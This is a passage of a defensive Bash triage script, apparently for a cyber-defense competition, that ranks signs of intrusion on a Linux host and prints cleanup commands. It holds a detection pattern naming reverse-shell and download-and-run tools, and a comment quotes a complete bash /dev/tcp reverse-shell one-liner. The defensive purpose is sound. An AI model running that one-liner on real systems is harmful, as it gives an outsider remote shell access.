#!/usr/bin/env bash
set -u

# triage.sh - the first thing you run, and the only one that RANKS.
#
# recon.sh and hunt.sh collect superbly and judge nothing. On the lab box they
# produced 5,359 lines across 22 files, and a real operator working the correct
# sequence found 1 of 3 planted footholds: the one he opened a file to read
# directly. The UID-0 account was one unremarkable row among 105. The
# /dev/tcp reverse shell in /etc/cron.d was line 53 of 4,008.
#
# Nobody reads 4,000 lines while the clock runs. So this does not collect
# anything new - it asks a short list of questions whose answers are almost
# never innocent, and prints only the answers that were not.
#
#   ./triage.sh --config FILE           everything below, ranked
#   ./triage.sh --config FILE --quiet   findings only, no "clean" lines
#   ./triage.sh --config FILE --findings-file ABS_PATH
#                                      atomically write this pass there
#
# READ-ONLY. Safe to run first, safe to run often, safe to run while panicking.
#
# The bar for a check appearing here is: when it fires on a competition box, it
# is wrong far more often than it is fine. A triage tool that cries wolf gets
# ignored by hour two, and then it is worth less than nothing, because you will
# believe you checked.

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$SCRIPT_DIR/lib/common.sh"

umask 077

config=''
quiet=0
__ccdc_triage_cli_findings=''
__ccdc_triage_cli_findings_set=0
while [ "$#" -gt 0 ]; do
  case "$1" in
    --config) config=${2:?missing config path}; shift 2 ;;
    --findings-file)
      [ "$__ccdc_triage_cli_findings_set" -eq 0 ] || ccdc_die "--findings-file may be supplied only once"
      __ccdc_triage_cli_findings=${2:?missing findings path}
      __ccdc_triage_cli_findings_set=1
      shift 2
      ;;
    --quiet) quiet=1; shift ;;
    -h|--help) printf 'usage: %s --config FILE [--quiet] [--findings-file ABS_PATH]\n' "$0"; exit 0 ;;
    *) ccdc_die "unknown argument: $1" ;;
  esac
done
[ -n "$config" ] || ccdc_die "--config is required"
# Preserve command-line precedence even though the selected config is sourced.
readonly __ccdc_triage_cli_findings __ccdc_triage_cli_findings_set
ccdc_load_config "$config"

state_dir=${CCDC_EVIDENCE_DIR:-/var/tmp/ccdc-evidence}
ccdc_validate_state_dir "$state_dir" "CCDC_EVIDENCE_DIR"
case "$state_dir" in */) state_dir=${state_dir%/} ;; esac
mkdir -p "$state_dir" 2>/dev/null \
  || ccdc_die "cannot create triage state directory: $state_dir (run with sudo or fix its ownership)"
[ -w "$state_dir" ] \
  || ccdc_die "triage state is not writable by $(id -un): $state_dir (run with sudo; refusing to split findings)"

findings=0
checks=0

# Severity is about what it means, not how the check is written:
#   RED    - this is an intrusion until proven otherwise. Act now.
#   AMBER  - legitimate on some boxes, so look, but do not assume.
red()   { findings=$((findings + 1)); printf '\n  \033[1;31mRED\033[0m    %s\n' "$1"; }
amber() { findings=$((findings + 1)); printf '\n  \033[1;33mAMBER\033[0m  %s\n' "$1"; }
detail(){ printf '         %s\n' "$1"; }

# Print the literal command to run, with this box's real values already in it.
#
# The card reference alone was not enough. Watching a real operator work a
# finding, he typed `sudo remove t-implant` - inventing a command - because the
# actual fix was a sed incantation inside a markdown file he was not looking at
# while the clock ran. A reference tells you where to go read; under pressure
# you need the command under your cursor. So triage now prints it.
#
# Nothing here is destructive-by-surprise: the ordering is lock-then-verify-
# then-remove, exactly as the cards describe, and the irreversible step is
# always last and always after something that shows you what you are about to
# remove.
# No "$" prefix. It looked like a prompt and read nicely - and the operator
# selected the block, pasted it, and got:
#
#     $: command not found
#     $: command not found
#
# because the prompt character came along with the text. Bash strips LEADING
# WHITESPACE from a command line, so an indented command pastes and runs
# exactly as written. The "run this" header above carries the meaning the "$"
# was carrying, without being a character the shell has to reject.
fix() { printf '           %s\n' "$1"; }

# Machine-readable findings, written every run alongside the human output.
#
# sentry.sh consumes this instead of re-implementing the checks or scraping the
# pretty output. One detection implementation, two readers - so a check can
# never be fixed here and stay broken there.
#
#   SEVERITY|CHECK|SUBJECT|DESCRIPTION
#
# SUBJECT is the thing to act on: a username, a path, or a documented compound
# value. It is the only field sentry parses for an argument.

# This kit's own payload directories.
#
# guardian's reconcile script legitimately contains the shapes the reverse-shell
# detector hunts for, so on an armed box triage reported its own tooling as RED
# on every pass - three findings that could never be cleared. An unclearable RED
# is worse than a missed one: it teaches you that RED can be ignored.
#
# Excluded here rather than in sentry, because sentry only decides what to TOUCH
# and these were still being reported forever. That tree is not unwatched: the
# guardian hash-pins every file it installs and repairs drift from an
# independent .repair source, which is a stronger check than this grep.
own_payload() {
  local path=$1 g gdir sdir
  g=${CCDC_GUARDIAN_NAME:-node-health}
  gdir=${CCDC_GUARDIAN_DIR:-/usr/local/lib/$g}
  sdir=${CCDC_SENTRY_DIR:-/usr/local/lib/${CCDC_SENTRY_NAME:-ccdc-sentry}}
  case "$path" in "$gdir"/*|"$sdir"/*) return 0 ;; esac
  return 1
}

if [ "$__ccdc_triage_cli_findings_set" -eq 1 ]; then
  findings_file=$__ccdc_triage_cli_findings
else
  findings_file=${CCDC_TRIAGE_FINDINGS:-$state_dir/triage.findings}
fi

validate_findings_file() {
  local path=$1 parent base
  case "$path" in /*) ;; *) ccdc_die "findings file must be absolute: $path" ;; esac
  case "$path" in
    *'//'*) ccdc_die "findings file contains an empty path component: $path" ;;
    */./*|*/.|*/../*|*/..) ccdc_die "findings file contains path traversal: $path" ;;
    *[!A-Za-z0-9_./@+-]*) ccdc_die "findings file contains unsupported whitespace, delimiter, or control characters: $path" ;;
  esac
  parent=$(dirname -- "$path")
  base=${path##*/}
  [ "$parent" = "$state_dir" ] \
    || ccdc_die "findings file must be a direct child of CCDC_EVIDENCE_DIR ($state_dir): $path"
  case "$base" in ''|.|..) ccdc_die "findings file has an invalid basename: $path" ;; esac
  [ ! -d "$path" ] || ccdc_die "findings file is a directory: $path"
}

validate_findings_file "$findings_file"
findings_tmp="$state_dir/.triage-findings-write.$$"
if ! (umask 077; set -o noclobber; : >"$findings_tmp") 2>/dev/null; then
  ccdc_die "cannot create a private findings staging file in $state_dir"
fi
cleanup_findings_tmp() {
  [ -z "${findings_tmp:-}" ] || rm -f -- "$findings_tmp" 2>/dev/null || true
}
trap cleanup_findings_tmp EXIT INT TERM HUP

machine_field_safe() {
  # The findings file is deliberately a tiny, dependency-free wire format.
  # Never let an attacker-chosen filename add a field or a second record.
  case "$1" in
    *'|'*|*$'\n'*|*$'\r'*) return 1 ;;
    *) return 0 ;;
  esac
}
machine_pair_safe() {
  # A few checks use SUBJECT=source::target. Keep that inner delimiter just as
  # unambiguous as the outer pipe-separated format.
  machine_field_safe "$1" && machine_field_safe "$2" || return 1
  case "$1"$'\n'"$2" in *'::'*) return 1 ;; esac
  return 0
}
machine_triple_safe() {
  machine_field_safe "$1" && machine_field_safe "$2" && machine_field_safe "$3" || return 1
  case "$1"$'\n'"$2"$'\n'"$3" in *'::'*) return 1 ;; esac
  return 0
}
emit() {
  if machine_field_safe "$1" && machine_field_safe "$2" &&
     machine_field_safe "$3" && machine_field_safe "$4"; then
    printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "$4" >>"$findings_tmp" \
      || ccdc_die "cannot append to findings staging file: $findings_tmp"
  else
    # Keep the human finding visible, but do not hand an ambiguous subject to
    # sentry for root execution.
    ccdc_warn "omitted a delimiter-unsafe $2 finding from the machine queue; inspect the human triage output"
  fi
}
fixhdr(){ printf '         ---- run this ----------------------------------------\n'; }
clean() { [ "$quiet" -eq 1 ] || printf '  ok     %s\n' "$1"; }
begin() { checks=$((checks + 1)); }

printf 'triage.sh - what should alarm you on %s, right now\n' "${CCDC_BOX_NAME:-this box}"
printf 'read-only. %s\n\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"

# --- 1. UID 0 accounts that are not root -------------------------------------
# The cheapest persistent root there is, and invisible in `who`, `sudo -l` and
# every "check for new users" habit that looks at UID >= 1000.
begin
uid0=$(awk -F: '$3==0 && $1!="root" {print $1}' /etc/passwd 2>/dev/null)
if [ -n "$uid0" ]; then
  red "account(s) with UID 0 other than root - this IS root access   [CARD 1]"
  for u in $uid0; do emit RED uid0 "$u" "UID 0 account that is not root"; done
  for u in $uid0; do
    detail "$(grep "^$u:" /etc/passwd)"
  done
  detail "confirm against the packet first - a scored account can have a bad UID"
  for u in $uid0; do
    printf -v quser '%q' "$u"
    fixhdr
    fix "sudo passwd -l $quser"
    fix "sudo usermod -s /usr/sbin/nologin $quser"
    fix "ps -ef | grep -w -- $quser | grep -v grep      # kill these by PID, NOT by user"
    fix "sudo userdel -f -r -- $quser                   # -f required; warns about PID 1"
  done
  detail "NEVER pkill -u on a UID-0 account: the name resolves to root and you"
  detail "would kill every root process on the box. See CARD 1."
else
  clean "no UID-0 accounts besides root"
fi

# --- 2. Accounts with no password --------------------------------------------
begin
if [ -r /etc/shadow ]; then
  empty=$(awk -F: '($2=="" ) {print $1}' /etc/shadow 2>/dev/null)
  if [ -n "$empty" ]; then
    red "account(s) with an EMPTY password: $(printf '%s' "$empty" | tr '\n' ' ')   [CARD 1]"
    for u in $empty; do emit RED emptypw "$u" "account with an empty password"; done
    detail "anyone who can reach a login prompt is already in"
    for u in $empty; do
      printf -v quser '%q' "$u"
      fixhdr
      fix "sudo passwd -l $quser"
      fix "sudo usermod -s /usr/sbin/nologin $quser"
      fix "sudo pkill -9 -u $quser                     # safe here: this is NOT UID 0"
      fix "sudo userdel -r -- $quser                      # only if the packet says it is not scored"
    done
  else
    clean "no empty-password accounts"
  fi
else
  clean "/etc/shadow unreadable (run with sudo for the password checks)"
fi

# --- 3. SSH authorized_keys ---------------------------------------------------
# Never "clean": every key is access, so every key has to be one you recognise.
# The operator who found this one in the drill found it because he opened the
# file. This makes opening the file unnecessary.
begin
keyfiles=()
add_keyfile() {
  local candidate=$1 existing
  [ -f "$candidate" ] || return 0
  for existing in "${keyfiles[@]}"; do
    [ "$existing" = "$candidate" ] && return 0
  done
  keyfiles+=("$candidate")
}
passwd_records() {
  if ccdc_have getent && getent passwd 2>/dev/null; then
    return 0
  fi
  cat /etc/passwd 2>/dev/null
}

# Account homes are not confined to /home. Service identities commonly live
# below /var/lib, and a key there grants the same access as one in /root. Use
# the system account database so LDAP/NSS-backed accounts are covered too.
while IFS=: read -r _ _ _ _ _ home _; do
  case "$home" in /*) add_keyfile "$home/.ssh/authorized_keys" ;; esac
done < <(passwd_records)

# Retain the old filesystem sweep as well: it catches orphaned /home trees
# that no longer have a passwd entry but still contain a usable key.
while IFS= read -r -d '' f; do add_keyfile "$f"; done \
  < <(find /root /home -maxdepth 3 -name authorized_keys -type f -print0 2>/dev/null)

if [ "${#keyfiles[@]}" -gt 0 ]; then
  total=0
  for f in "${keyfiles[@]}"; do
    # `grep -c` PRINTS 0 and EXITS 1 when there are no matches, so a
    # `|| printf 0` fallback appends a second 0 and the test below then dies
    # with "integer expression expected". Check for empty instead.
    n=$(grep -c '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
    [ -n "$n" ] || n=0
    [ "$n" -gt 0 ] && total=$((total + n))
  done
  if [ "$total" -gt 0 ]; then
    amber "$total SSH key(s) grant login. Recognise EVERY one or remove it   [CARD 2]"
    for f in "${keyfiles[@]}"; do
      n=$(grep -c '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
      [ -n "$n" ] || n=0
      [ "$n" -gt 0 ] && emit AMBER sshkey "$f" "SSH keys grant login here"
    done
    for f in "${keyfiles[@]}"; do
      while IFS= read -r k; do
        [ -n "$k" ] || continue
        detail "$(printf '%s' "$f"): ...$(printf '%s' "$k" | tail -c 45)"
        # A ready-to-run deletion for THIS key, matched on the LAST 24 chars
        # of the key body.
        #
        # It must be the tail. The first 24 characters are the algorithm
        # prefix - every ed25519 key begins "AAAAC3NzaC1lZDI1NTE5AAAA" - so a
        # leading slice matches EVERY key of that type and the command would
        # empty the file, locking you out. Caught on the lab box only because
        # the generated command was read before it was run.
        #
        # The | delimiter is also deliberate: base64 contains / and would
        # terminate a /.../ expression early.
        slice=$(printf '%s' "$k" | awk '{print $2}' | tail -c 25 | tr -d '\n')
        if [ -n "$slice" ]; then
          case "$slice" in
            *[!A-Za-z0-9+/=]*)
              detail "key line is malformed; edit this file manually (no generated delete command)"
              continue
              ;;
          esac
          printf -v qf '%q' "$f"
          printf -v qbak '%q' "$f.bak"
          printf -v qsed '%q' "\\|$slice|d"
          fix "sudo cp -- $qf $qbak && sudo sed -i $qsed $qf"
        fi
      done < <(grep '^[[:space:]]*[^#[:space:]]' "$f" 2>/dev/null)
    done
    detail "delete ONLY the lines you do not recognise - never truncate the file,"
    detail "your own key is probably in it. Keep this session open, then verify:"
    fix "sudo sshd -t && ssh banneluk@\$(hostname -I | awk '{print \$1}')   # from ANOTHER terminal"
  else
    clean "no SSH authorized_keys entries"
  fi
else
  clean "no authorized_keys files"
fi

# --- 4. Scheduled jobs that call home ----------------------------------------
# Not "is there a cron entry" - there are always cron entries, and that is why
# the real one hid in 4,008 lines. This asks whether a scheduled job contains
# the shapes that only ever mean a shell.
begin
shells='/dev/tcp|/dev/udp|nc -|ncat|netcat|bash -i|sh -i|curl .*\| *(ba)?sh|wget .*\| *(ba)?sh|base64 -d|python.? -c|perl -e|socat'

# Print conservative, delimiter-safe absolute-path tokens from a command line.
# This intentionally declines paths containing whitespace or shell metacharacters
# instead of trying to emulate either cron's or systemd's command parser.
absolute_tokens() {
  LC_ALL=C grep -oE '/[A-Za-z0-9._+@%~-]+(/[A-Za-z0-9._+@%~-]+)*' 2>/dev/null || true
}

# Commands that launch another command/script rather than being the payload
# themselves. For these, inspect absolute regular-file arguments as well as the
# first executable. No command text is ever evaluated.
is_launch_wrapper() {
  case "${1##*/}" in
    sh|bash|dash|zsh|ksh|python|python[0-9]*|perl|ruby|php|node|env|nohup|setsid|\
    timeout|nice|ionice|chrt|stdbuf|flock|sudo|su|runuser|busybox|daemonize|\
    start-stop-daemon) return 0 ;;
    *) return 1 ;;
  esac
}

cronhits=$(grep -rIlE "$shells" /etc/cron.d /etc/cron.daily /etc/cron.hourly \
  /etc/cron.weekly /etc/cron.monthly /etc/crontab /var/spool/cron 2>/dev/null)
if [ -n "$cronhits" ]; then
  red "scheduled job(s) containing reverse-shell or download-and-run patterns   [CARD 3]"
  for f in $cronhits; do emit RED cron "$f" "scheduled job containing a reverse shell"; done
  for f in $cronhits; do
    detail "$f"
    while IFS= read -r l; do
      detail "    $(printf '%s' "$l" | cut -c1-96)"
    done <<EOF
$(grep -IhE "$shells" "$f" 2>/dev/null | head -3)
EOF
    printf -v qf '%q' "$f"
    printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
    fixhdr
    fix "sudo cp -- $qf $qevidence   # keep it, the IR inject wants it"
    fix "sudo rm -f -- $qf"
  done
  detail "then follow what it CALLED - the cron line is the schedule, not the payload:"
  fix "sudo ss -tnp | grep -v 127.0.0.1        # is it connected right now?"
else
  clean "no scheduled job matches a reverse-shell pattern"
fi

# The cron entry can be clean while the executable it names contains the
# payload. Follow one hop through absolute targets, including a non-executable
# script passed to a known interpreter/wrapper. This catches, for example,
# `root /usr/local/bin/net-check` and `/bin/bash /opt/check.sh` without sourcing
# or executing attacker-controlled text.
begin
cron_sources=()
add_cron_source() {
  local candidate=$1 existing
  [ -f "$candidate" ] || return 0
  for existing in "${cron_sources[@]}"; do
    [ "$existing" = "$candidate" ] && return 0
  done
  cron_sources+=("$candidate")
}
add_cron_source /etc/crontab
for cron_root in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly \
                 /etc/cron.monthly /var/spool/cron; do
  [ -d "$cron_root" ] || continue
  while IFS= read -r -d '' f; do add_cron_source "$f"; done \
    < <(find "$cron_root" -type f -print0 2>/dev/null)
done

crondeep=()
for source in "${cron_sources[@]}"; do
  while IFS= read -r line || [ -n "$line" ]; do
    trimmed=${line#"${line%%[![:space:]]*}"}
    case "$trimmed" in ''|'#'*) continue ;; esac
    # Cron environment assignments are data, not launch commands. Ignoring
    # them avoids following PATH/SHELL values as if cron executed each path.
    printf '%s\n' "$trimmed" | grep -qE '^[A-Za-z_][A-Za-z0-9_]*[[:space:]]*=' && continue

    targets=()
    while IFS= read -r target; do
      [ -n "$target" ] && targets+=("$target")
    done < <(printf '%s\n' "$trimmed" | absolute_tokens)
    [ "${#targets[@]}" -gt 0 ] || continue
    # A stepped cron field such as */5 looks like the absolute token `/5`.
    # Anchor wrapper/direct-target decisions to the first token that is an
    # actual regular file, not merely the first slash-shaped substring.
    primary=''
    for target in "${targets[@]}"; do
      if [ -f "$target" ]; then primary=$target; break; fi
    done
    [ -n "$primary" ] || continue

    for target in "${targets[@]}"; do
      [ -f "$target" ] || continue
      # A direct executable is a launch target. A known wrapper/interpreter
      # also makes its regular-file arguments launch targets.
      if [ "$target" != "$primary" ] && [ ! -x "$target" ] && ! is_launch_wrapper "$primary"; then
        continue
      fi
      own_payload "$target" && continue
      grep -qIE "$shells" "$target" 2>/dev/null || continue
      hit="$source::$target"
      duplicate=0
      for existing in "${crondeep[@]}"; do
        [ "$existing" = "$hit" ] && duplicate=1 && break
      done
      [ "$duplicate" -eq 1 ] || crondeep+=("$hit")
    done
  done <"$source"
done

if [ "${#crondeep[@]}" -gt 0 ]; then
  red "scheduled job(s) launching a file that contains a reverse shell   [CARD 3]"
  detail "the schedule looks clean - the payload is one level down"
  for e in "${crondeep[@]}"; do
    source=${e%%::*}; target=${e#*::}
    detail "$source -> $target"
    if machine_pair_safe "$source" "$target"; then
      emit RED crondeep "$e" "scheduled job launching a file containing a reverse shell"
    else
      ccdc_warn "omitted an ambiguous crondeep subject from the machine queue; inspect the human triage output"
    fi
    while IFS= read -r l; do detail "    $(printf '%s' "$l" | cut -c1-88)"; done \
      < <(grep -IhE "$shells" "$target" 2>/dev/null | head -2)
    printf -v qsource '%q' "$source"
    printf -v qtarget '%q' "$target"
    printf -v qsource_evidence '%q' "/var/tmp/evidence-cron-$(basename "$source")"
    printf -v qtarget_evidence '%q' "/var/tmp/evidence-payload-$(basename "$target")"
    fixhdr
    fix "sudo cp -- $qsource $qsource_evidence"
    fix "sudo cp -- $qtarget $qtarget_evidence"
    fix "sudo nano $qsource      # delete only the schedule line that names $qtarget"
    fix "sudo rm -f -- $qtarget"
  done
else
  clean "no scheduled job launches a file containing a reverse shell"
fi

# --- 5. systemd units that call home -----------------------------------------
begin
unithits=$(grep -rIlE "$shells" /etc/systemd/system /run/systemd/system 2>/dev/null)
if [ -n "$unithits" ]; then
  red "systemd unit(s) containing reverse-shell or download-and-run patterns   [CARD 4]"
  for f in $unithits; do
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        owner=${parent%.d}
        if machine_pair_safe "$owner" "$f"; then
          emit RED unitdropin "$owner::$f" "drop-in containing a reverse shell"
        else
          ccdc_warn "omitted an ambiguous unitdropin subject from the machine queue; inspect the human triage output"
        fi
        ;;
      *) emit RED unit "$f" "unit containing a reverse shell" ;;
    esac
  done
  for f in $unithits; do
    detail "$f"
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        u=${parent%.d}
        printf -v qf '%q' "$f"
        printf -v qunit_name '%q' "$u"
        printf -v qevidence '%q' "/var/tmp/evidence-$(basename -- "$f")"
        fixhdr
        fix "sudo systemctl cat -- $qunit_name                  # read the merged unit before changing it"
        fix "sudo cp -- $qf $qevidence"
        fix "sudo rm -f -- $qf                         # remove only the malicious drop-in"
        fix "sudo systemctl daemon-reload && sudo systemctl try-restart -- $qunit_name"
        continue
        ;;
    esac
    u=$(basename -- "$f")
    printf -v qf '%q' "$f"
    printf -v qdropdir '%q' "$f.d"
    printf -v qunit_name '%q' "$u"
    fixhdr
    fix "sudo systemctl cat -- $qunit_name                  # read it before you delete it"
    fix "sudo systemctl disable --now -- $qunit_name"
    fix "sudo rm -f -- $qf && sudo rm -rf -- $qdropdir      # .d holds drop-in overrides"
    fix "sudo systemctl daemon-reload && sudo systemctl reset-failed"
  done
else
  clean "no systemd unit matches a reverse-shell pattern"
fi

# Units executing out of a world-writable directory are a separate tell: the
# path is the finding, whatever the command looks like.
begin
tmpunits=$(grep -rIlE '^Exec[A-Za-z]*=.*(/tmp/|/var/tmp/|/dev/shm/)' \
  /etc/systemd/system /run/systemd/system 2>/dev/null)
if [ -n "$tmpunits" ]; then
  red "systemd unit(s) executing from a world-writable directory   [CARD 4]"
  for f in $tmpunits; do
    case "$f" in
      *.service.d/*.conf|*.timer.d/*.conf)
        parent=$(basename -- "$(dirname -- "$f")")
        owner=${parent%.d}
        if machine_pair_safe "$owner" "$f"; then
          emit RED unitdropin "$owner::$f" "drop-in executing from a world-writable directory"
        else
          ccdc_warn "omitted an ambiguous unitdropin subject from the machine queue; inspect the human triage output"
        fi
        ;;
      *) emit RED unittmp "$f" "unit executing from a world-writable directory" ;;
    esac
  done
  for f in $tmpunits; do detail "$f"; done
else
  clean "no systemd unit executes from /tmp, /var/tmp or /dev/shm"
fi

# --- 6. Passwordless sudo -----------------------------------------------------
begin
nopw=$(grep -rIh '^[^#]*NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -v '^\s*$')
if [ -n "$nopw" ]; then
  amber "passwordless sudo is configured - confirm each line is the packet's   [CARD 7]"
  emit AMBER nopasswd "sudoers" "passwordless sudo is configured"
  while IFS= read -r l; do detail "$(printf '%s' "$l" | cut -c1-96)"; done <<EOF
$nopw
EOF
else
  clean "no NOPASSWD sudo rules"
fi

# --- 7. SUID interpreters -----------------------------------------------------
# A SUID shell or scripting language is not a configuration choice anyone makes.
# Distinguished from the general SUID list, which is long and mostly legitimate
# and therefore unreadable - which is how a SUID bash hides in it.
begin
suid=$(find / -xdev -perm -4000 -type f 2>/dev/null \
  | grep -E '/(bash|sh|dash|zsh|ksh|python[0-9.]*|perl|ruby|php|awk|find|vim?|nano|less|more|tar|cp|env|node)$')
if [ -n "$suid" ]; then
  red "SUID interpreter(s)/utilities - instant root for any local user   [CARD 5]"
  for f in $suid; do emit RED suid "$f" "SUID interpreter or file utility"; done
  fixhdr
  for f in $suid; do
    detail "$(ls -l "$f" 2>/dev/null)"
    printf -v qf '%q' "$f"
    fix "sudo chmod u-s -- $qf                      # strip SUID; do NOT delete the binary"
  done
else
  clean "no SUID shells or interpreters"
fi

# --- 8. Processes running from a world-writable directory ---------------------
begin
tmpproc=$(ls -l /proc/*/exe 2>/dev/null | grep -E '/(tmp|var/tmp|dev/shm)/' | head -10)
if [ -n "$tmpproc" ]; then
  red "process(es) executing from /tmp, /var/tmp or /dev/shm   [CARD 6]"
  emit RED tmpproc "see-log" "process executing from a world-writable directory"
  while IFS= read -r l; do detail "$(printf '%s' "$l" | cut -c1-110)"; done <<EOF
$tmpproc
EOF
else
  clean "no process runs from a world-writable directory"
fi

# Deleted-on-disk executables: the classic "drop it, run it, unlink it" so the
# payload exists only in memory and hunt.sh's file sweeps cannot see it.
begin
deleted=$(ls -l /proc/*/exe 2>/dev/null | grep '(deleted)' | grep -vE '/(systemd|dbus)' | head -5)
if [ -n "$deleted" ]; then
  amber "process(es) whose executable was deleted from disk   [CARD 6]"
  detail "sometimes a mid-upgrade daemon, sometimes a payload that unlinked itself"
  while IFS= read -r l; do detail "$(printf '%s' "$l" | cut -c1-110)"; done <<EOF
$deleted
EOF
else
  clean "no running process has a deleted executable"
fi

# --- 9. Listeners the packet does not account for -----------------------------
begin
if ccdc_have ss && [ -n "${CCDC_ALLOWED_TCP_PORTS:-}" ]; then
  unexpected=''
  # Loopback-only listeners are excluded deliberately. The standard this check
  # enforces is "nothing but scored services should show on an nmap scan", and
  # a socket bound to 127.0.0.x or ::1 shows on no scan from anywhere. Leaving
  # them in flagged systemd-resolved's 127.0.0.53:53 on every run, and a check
  # that is wrong on a stock box every time is a check you stop reading.
  while IFS= read -r port; do
    [ -n "$port" ] || continue
    ccdc_list_contains "$port" "${CCDC_ALLOWED_TCP_PORTS:-}" || unexpected="$unexpected $port"
  done <<EOF
$(ss -tlnH 2>/dev/null | awk '$4 !~ /^(127\.|\[::1\]|::1)/ {print $4}' | sed 's/.*://' | sort -un)
EOF
  if [ -n "$unexpected" ]; then
    amber "listening TCP port(s) not in CCDC_ALLOWED_TCP_PORTS:$unexpected   [CARD 8]"
    for p in $unexpected; do emit AMBER port "$p" "listening port not in the allow list"; done
    detail "\"nothing but scored services should show on an nmap scan\""
    for p in $unexpected; do
      detail "$(ss -tlnpH "sport = :$p" 2>/dev/null | head -1 | cut -c1-100)"
    done
  else
    clean "no unexpected listening TCP ports"
  fi
else
  clean "port check skipped (need ss + CCDC_ALLOWED_TCP_PORTS)"
fi

# --- 9-ii. Listening UDP ports ------------------------------------------------
# UDP gets its own check because the TCP one cannot see it at all, and a UDP
# listener is a normal way to hold a foothold that survives a TCP-only firewall
# review.
#
# CCDC_ALLOWED_UDP_PORTS is empty on most boxes - the packet usually scores TCP
# services - so an allow-list-only test would flag stock Ubuntu's DHCP client and
# mDNS responder on every single pass. A check that is wrong on a clean box is a
# check you stop reading, so the stock set below is allowed implicitly. It is
# deliberately short: these are the ports a default install binds, not a blanket
# "common services" list, because the whole value of this check is that an
# unexplained UDP port stands out.
#
# The ephemeral range is excluded for the same reason, and it is read from the
# kernel rather than guessed. Every outbound UDP client - the resolver, NTP,
# anything that has ever sent a packet - holds an unconnected socket on a random
# high port, and those ports are DIFFERENT on every pass. Reported, they are a
# permanent block of findings that never repeats and never means anything.
#
# That is a real hole and it is covered deliberately somewhere else: check 9-iii
# below looks at every listening socket by OWNER, so a payload that binds UDP
# 45000 is caught there by what is holding it, not by its port number.
begin
stock_udp='68 546 123 323 5353 631 111 67'
ephemeral_low=32768
ephemeral_high=60999
if [ -r /proc/sys/net/ipv4/ip_local_port_range ]; then
  read -r __eph_low __eph_high </proc/sys/net/ipv4/ip_local_port_range 2>/dev/null || true
  case "${__eph_low:-}${__eph_high:-}" in
    ''|*[!0-9]*) : ;;
    *) ephemeral_low=$__eph_low; ephemeral_high=$__eph_high ;;
  esac
fi
if ccdc_have ss; then
  unexpected_udp=''
  while IFS= read -r port; do
    [ -n "$port" ] || continue
    ccdc_list_contains "$port" "${CCDC_ALLOWED_UDP_PORTS:-}" && continue
    ccdc_list_contains "$port" "$stock_udp" && continue
    [ "$port" -ge "$ephemeral_low" ] 2>/dev/null && [ "$port" -le "$ephemeral_high" ] 2>/dev/null && continue
    unexpected_udp="$unexpected_udp $port"
  done <<EOF
$(ss -ulnH 2>/dev/null | awk '$4 !~ /^(127\.|\[::1\]|::1)/ {print $4}' | sed 's/.*://' | sort -un)
EOF
  if [ -n "$unexpected_udp" ]; then
    amber "listening UDP port(s) not accounted for:$unexpected_udp   [CARD 8]"
    for p in $unexpected_udp; do emit AMBER udpport "$p" "listening UDP port not in the allow list"; done
    detail "UDP does not appear in a TCP port review and is easy to forget"
    for p in $unexpected_udp; do
      detail "$(ss -ulnpH "sport = :$p" 2>/dev/null | head -1 | cut -c1-100)"
    done
  else
    clean "no unexpected listening UDP ports"
  fi
else
  clean "UDP port check skipped (need ss)"
fi

# --- 9-iii. What is HOLDING the network sockets -------------------------------
# Every check above this line reads something at rest: a file, an account, a
# unit. All of them are blind to the payload that never touched the disk -
#
#     bash -i >& /dev/tcp/10.0.0.5/443 0>&1
#
# - because there is no file to find, the port is one the firewall must allow,
# and the connection is outbound so no listener appears anywhere. The only place
# it is visible is the socket table, and the finding is not the port. It is WHO
# IS HOLDING IT.
#
# So this does not ask "is this port allowed". It asks whether the process on
# the end of a socket has any business being on the end of a socket. A shell or
# an interpreter holding a connection to the outside is the single highest-
# confidence signal in this file: nothing about administering a web server
# leaves bash attached to a foreign address.
#
# Three separate tells, in descending confidence:
#   1. the owner is a shell/interpreter/netcat        (reverse or bind shell)
#   2. the owner's executable was deleted or lives in /tmp   (dropped payload)
#   3. the owner's executable belongs to no package   (AMBER: compiled implant,
#      but also every from-source install, so it is a prompt and not a verdict)
#
# Root sees every socket's owner. A normal user sees only their own, which is
# partial and still worth having - the first triage of an event is usually run
# before anyone has thought about sudo, and a payload running as the account you
# are logged in on is exactly the case that is visible. What must never happen is
# a partial pass printing the word "clean" as if it were a whole one, so the
# result line below says which of the two runs you just did.
begin
if ! ccdc_have ss; then
  clean "socket owner check skipped (need ss)"
else
  socket_scope='every process'
  [ "$(id -u)" -eq 0 ] || socket_scope="only $(id -un)'s own processes - RE-RUN WITH SUDO for the rest"
  # Ports this box listens on. A TCP session whose LOCAL port is one of these is
  # someone connecting IN; anything else is this box reaching OUT. Getting that
  # backwards would report every visitor to a scored web server as an outbound
  # C2 channel, so it is computed from the live listen table rather than assumed.
  listen_ports=$(ss -tlnH 2>/dev/null | awk '{print $4}' | sed 's/.*://' | sort -un | tr '\n' ' ')

  # Cache the package lookup per executable: a busy box has hundreds of sockets
  # and a handful of distinct binaries behind them.
  pkg_cache_paths=''
  pkg_cache_states=''
  pkg_owned() {
    local exe=$1 i=0 p state
    for p in $pkg_cache_paths; do
      i=$((i + 1))
      if [ "$p" = "$exe" ]; then
        state=$(printf '%s' "$pkg_cache_states" | cut -d' ' -f"$i")
        [ "$state" = yes ]
        return
      fi
    done
    state=unknown
    if ccdc_have dpkg-query; then
      dpkg-query -S "$exe" >/dev/null 2>&1 && state=yes || state=no
    elif ccdc_have rpm; then
      rpm -qf "$exe" >/dev/null 2>&1 && state=yes || state=no
    fi
    # Only cache path-shaped keys; a path with whitespace would corrupt the
    # parallel word lists, so such an executable simply is not cached.
    case "$exe" in
      *[![:space:]]*[[:space:]]*) : ;;
      *) pkg_cache_paths="$pkg_cache_paths $exe"; pkg_cache_states="$pkg_cache_states $state" ;;
    esac
    [ "$state" = yes ]
  }

  # Why this process holding this socket is not normal - or nothing, if it is.
  # Prints the reason and returns 0; returns 1 for an ordinary daemon.
  socket_owner_reason() {
    local exe=$1 base
